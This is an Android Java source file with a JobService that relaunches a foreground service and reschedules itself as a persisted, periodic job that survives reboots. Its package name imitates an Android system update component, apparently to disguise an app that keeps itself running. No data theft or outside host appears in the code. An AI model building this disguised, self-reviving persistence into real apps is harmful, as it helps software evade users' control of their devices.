package com.android.system.update.services;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class RealJobSchedulerService extends JobService {
    private static final String TAG = "RealJobScheduler";
    private static final int JOB_ID = 9999;

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "Job started - ensuring service is running");
        
        try {
            // Start your foreground service
            Intent serviceIntent = new Intent(this, ForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "Service started from JobScheduler");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service: " + e.getMessage());
        }
        
        // Schedule the next job
        scheduleJob(this);
        
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "Job stopped - rescheduling");
        scheduleJob(this);
        return true;
    }

    public static void scheduleJob(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            
            ComponentName componentName = new ComponentName(context, RealJobSchedulerService.class);
            
            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, componentName)
                    .setPersisted(true) // Survive reboots
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false);
            
            // Set periodic interval (minimum 15 minutes for Android N+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                builder.setPeriodic(15 * 60 * 1000); // 15 minutes
            } else {
                builder.setPeriodic(10 * 60 * 1000); // 10 minutes
            }
            
            int result = jobScheduler.schedule(builder.build());
            
            if (result == JobScheduler.RESULT_SUCCESS) {
                Log.d(TAG, "Job scheduled successfully");
            } else {
                Log.e(TAG, "Job scheduling failed");
            }
        }
    }
}
